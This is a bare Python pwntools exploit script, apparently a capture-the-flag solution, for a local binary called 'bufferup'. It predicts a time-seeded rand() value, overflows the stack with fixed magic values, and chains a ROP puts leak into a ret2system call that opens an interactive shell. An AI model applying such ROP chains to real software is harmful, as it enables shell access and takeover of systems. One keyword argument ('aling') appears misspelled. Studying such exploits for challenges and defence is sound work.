#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL
from time import time

exe = context.binary = ELF('./bufferup')
libc = exe.libc
rop = ROP(exe)

io = process()

ctype_libc = CDLL(exe.libc.path)
ctype_libc.srand(int(time()) & 0xffffff00)
random = str(ctype_libc.rand())
count = sum([int(i) for i in random])

cafebabe = (lambda string: int(string[:len(string) // 2][::-1] + string[len(string) // 2:][::-1]))(str(0xcafebabe))

rop.ret2plt(leak=exe.got.puts, ret=exe.sym.main)

payload = cyclic(40) + p64(count) + p64(0xc0cacede) + p64(0xfacefeed) + p64(cafebabe) + cyclic(16) + rop.chain()

io.sendline(payload)
io.recvline()
libc.address = io.recv_libc_leak(libc.sym.puts)

rop1 = ROP(libc)
rop1.ret2system(aling=True)

payload = cyclic(40) + p64(count) + p64(0xc0cacede) + p64(0xfacefeed) + p64(cafebabe) + cyclic(16) + rop1.chain()

io.sendline(payload)

io.interactive()